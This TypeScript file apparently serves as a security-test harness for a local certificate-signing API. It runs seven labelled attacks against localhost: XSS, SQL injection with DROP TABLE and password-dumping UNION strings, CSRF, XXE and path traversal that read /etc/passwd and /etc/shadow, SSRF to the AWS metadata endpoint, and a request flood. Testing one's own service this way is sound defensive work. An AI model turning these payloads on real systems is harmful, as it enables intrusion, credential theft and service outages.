import { PrismaClient } from '@prisma/client';
import { faker } from '@faker-js/faker';
import jwt from 'jsonwebtoken';
import axios from 'axios';

const prisma = new PrismaClient();
const JWT_SECRET = process.env.JWT_SECRET || 'your-secure-secret';

export const generateTIN = (prefix: string) => {
	const date = new Date();

	const timestamp = date
		.toISOString()
		.replace(/[-:.TZ]/g, '')
		.slice(0, 14); // YYYYMMDDHHMMSS

	return prefix + timestamp;
};

// ----------------------------
// 1. Cross-Site Scripting (XSS)
// ----------------------------
const xssAttack = async (url: string) => {
	try {
		const headers = {
			Authorization: 'Bearer valid-token', // Replace with valid token
			'x-api-tran-id': generateTIN('XSS'),
		};

		const maliciousScript = "<script>alert('XSS')</script>";

		const body = {
			sign_tx_id: 'ORG2025001_CA20250001_20250117120000_RITFHJGITORP',
			user_ci: '1234567890123456789012345678901234567890123456789012345678901234',
			real_name: 'John Doe',
			phone_num: '+821012345678',
			request_title: maliciousScript, // Inject XSS payload
			device_code: 'PC',
			device_browser: 'WB',
			return_app_scheme_url: 'mydata://auth',
			consent_type: '0',
			consent_cnt: 1,
			consent_list: [
				{
					tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
					consent_title: maliciousScript, // Second injection point
					consent: '958675948576879',
					consent_len: 15,
				},
			],
		};

		const response = await fetch(url, {
			method: 'POST',
			headers,
			body: JSON.stringify(body),
		});

		console.log('XSS Attack:');
		console.log(`Status Code: ${response.status}`);
		console.log(`Response: ${await response.text()}\n`);
	} catch (error) {
		console.error('XSS Attack Error:', error);
	}
};

// ----------------------
// 2. SQL Injection (SQLi)
// ----------------------
const sqlInjectionAttack = async (url: string) => {
	try {
		const payloads = ["' OR '1'='1--", "'; DROP TABLE users--", "' UNION SELECT username, password FROM users--"];

		for (const payload of payloads) {
			const headers = {
				Authorization: 'Bearer valid-token',
				'x-api-tran-id': generateTIN('SQLi'),
			};

			const body = {
				sign_tx_id: payload, // SQLi in transaction ID
				user_ci: '1234567890123456789012345678901234567890123456789012345678901234',
				real_name: 'John Doe',
				phone_num: '+821012345678',
				request_title: 'Malicious Request',
				device_code: 'PC',
				device_browser: 'WB',
				return_app_scheme_url: 'mydata://auth',
				consent_type: '0',
				consent_cnt: 1,
				consent_list: [
					{
						tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
						consent_title: 'Consent',
						consent: payload, // SQLi in consent field
						consent_len: 15,
					},
				],
			};

			const response = await fetch(url, {
				method: 'POST',
				headers,
				body: JSON.stringify(body),
			});

			console.log(`SQLi Payload: ${payload}`);
			console.log(`Status Code: ${response.status}`);
			console.log(`Response: ${await response.text()}\n`);
		}
	} catch (error) {
		console.error('SQL Injection Error:', error);
	}
};

// ---------------------------------
// 3. Cross-Site Request Forgery (CSRF)
// ---------------------------------
const csrfAttack = async (url: string) => {
	try {
		// Simulate CSRF by omitting auth headers
		const body = {
			sign_tx_id: 'ORG2025001_CA20250001_20250117120000_RITFHJGITORP',
			user_ci: '1234567890123456789012345678901234567890123456789012345678901234',
			real_name: 'CSRF Victim',
			phone_num: '+821012345678',
			request_title: 'CSRF Attack',
			device_code: 'PC',
			device_browser: 'WB',
			return_app_scheme_url: 'mydata://auth',
			consent_type: '0',
			consent_cnt: 1,
			consent_list: [
				{
					tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
					consent_title: 'Consent',
					consent: '958675948576879',
					consent_len: 15,
				},
			],
		};

		const response = await fetch(url, {
			method: 'POST',
			body: JSON.stringify(body),
		});

		console.log('CSRF Attack:');
		console.log(`Status Code: ${response.status}`);
		console.log(`Response: ${await response.text()}\n`);
	} catch (error) {
		console.error('CSRF Attack Error:', error);
	}
};

// --------------------------------
// 4. XML External Entity (XXE) Injection
// --------------------------------
const xxeAttack = async (url: string) => {
	try {
		const xmlPayload = `<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <sign_tx_id>&xxe;</sign_tx_id>
</root>`;

		const response = await fetch(url, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/xml',
				'x-api-tran-id': generateTIN('XXE'),
			},
			body: xmlPayload,
		});

		console.log('XXE Attack:');
		console.log(`Status Code: ${response.status}`);
		console.log(`Response: ${await response.text()}\n`);
	} catch (error) {
		console.error('XXE Attack Error:', error);
	}
};

// ------------------------
// 5. Directory Traversal
// ------------------------
const directoryTraversalAttack = async (url: string) => {
	try {
		const headers = {
			Authorization: 'Bearer valid-token',
			'x-api-tran-id': generateTIN('DIR'),
		};

		const body = {
			sign_tx_id: 'ORG2025001_CA20250001_20250117120000_RITFHJGITORP',
			user_ci: '../../../../etc/passwd', // Directory traversal
			real_name: 'John Doe',
			phone_num: '+821012345678',
			request_title: 'Sensitive File Access',
			device_code: 'PC',
			device_browser: 'WB',
			return_app_scheme_url: 'mydata://auth',
			consent_type: '0',
			consent_cnt: 1,
			consent_list: [
				{
					tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
					consent_title: 'Consent',
					consent: '../../../../etc/shadow', // Second traversal attempt
					consent_len: 15,
				},
			],
		};

		const response = await fetch(url, {
			method: 'POST',
			headers,
			body: JSON.stringify(body),
		});

		console.log('Directory Traversal Attack:');
		console.log(`Status Code: ${response.status}`);
		console.log(`Response: ${await response.text()}\n`);
	} catch (error) {
		console.error('Directory Traversal Error:', error);
	}
};

// --------------------------------
// 6. Server-Side Request Forgery (SSRF)
// --------------------------------
const ssrfAttack = async (url: string) => {
	try {
		const headers = {
			Authorization: 'Bearer valid-token',
			'x-api-tran-id': generateTIN('SSRF'),
		};

		const body = {
			sign_tx_id: 'ORG2025001_CA20250001_20250117120000_RITFHJGITORP',
			user_ci: '1234567890123456789012345678901234567890123456789012345678901234',
			real_name: 'John Doe',
			phone_num: '+821012345678',
			request_title: 'SSRF Attack',
			device_code: 'PC',
			device_browser: 'WB',
			return_app_scheme_url: 'http://169.254.169.254/latest/meta-data/', // AWS metadata endpoint
			consent_type: '0',
			consent_cnt: 1,
			consent_list: [
				{
					tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
					consent_title: 'Consent',
					consent: 'http://internal-server:8080/admin',
					consent_len: 15,
				},
			],
		};

		const response = await fetch(url, {
			method: 'POST',
			headers,
			body: JSON.stringify(body),
		});

		console.log('SSRF Attack:');
		console.log(`Status Code: ${response.status}`);
		console.log(`Response: ${await response.text()}\n`);
	} catch (error) {
		console.error('SSRF Attack Error:', error);
	}
};

// ------------------------
// 7. Denial of Service (DoS)
// ------------------------
const dosAttack = async (url: string, requests: number = 1000) => {
	try {
		const headers = {
			Authorization: 'Bearer valid-token',
			'x-api-tran-id': generateTIN('DoS'),
		};

		const body = {
			sign_tx_id: 'ORG2025001_CA20250001_20250117120000_RITFHJGITORP',
			user_ci: '1234567890123456789012345678901234567890123456789012345678901234',
			real_name: 'DoS Attacker',
			phone_num: '+821012345678',
			request_title: 'A'.repeat(1000000), // Large payload
			device_code: 'PC',
			device_browser: 'WB',
			return_app_scheme_url: 'mydata://auth',
			consent_type: '0',
			consent_cnt: 1,
			consent_list: [
				{
					tx_id: 'MD1234567890_0987654321_1234567890_20250117120000_E349RU3IDKFJ',
					consent_title: 'Consent',
					consent: 'B'.repeat(1000000), // Large payload
					consent_len: 15,
				},
			],
		};

		// Flood the API with requests
		for (let i = 0; i < requests; i++) {
			await fetch(url, {
				method: 'POST',
				headers,
				body: JSON.stringify(body),
			});
			console.log(`DoS Request ${i + 1} Sent`);
		}
	} catch (error) {
		console.error('DoS Attack Error:', error);
	}
};

// ------------------------
// Main Execution
// ------------------------
const runAttackSimulations = async () => {
	const baseUrl = 'http://localhost:3000/api';

	console.log('Starting All Attack Simulations...\n');

	// 1. XSS Attack
	await xssAttack(`${baseUrl}/ca/sign_request`);

	// 2. SQL Injection
	await sqlInjectionAttack(`${baseUrl}/ca/sign_request`);

	// 3. CSRF Attack
	await csrfAttack(`${baseUrl}/ca/sign_request`);

	// 4. XXE Attack
	await xxeAttack(`${baseUrl}/ca/sign_request`); // Assumes XML endpoint

	// 5. Directory Traversal
	await directoryTraversalAttack(`${baseUrl}/ca/sign_request`);

	// 6. SSRF Attack
	await ssrfAttack(`${baseUrl}/ca/sign_request`);

	// 7. DoS Attack (Reduce requests for testing)
	await dosAttack(`${baseUrl}/ca/sign_request`, 100);

	console.log('All Attack Simulations Completed!');
};

// Run simulations
runAttackSimulations()
	.catch((e) => {
		console.error('Global Simulation Error:', e);
		process.exit(1);
	})
	.finally(async () => {
		await prisma.$disconnect();
	});
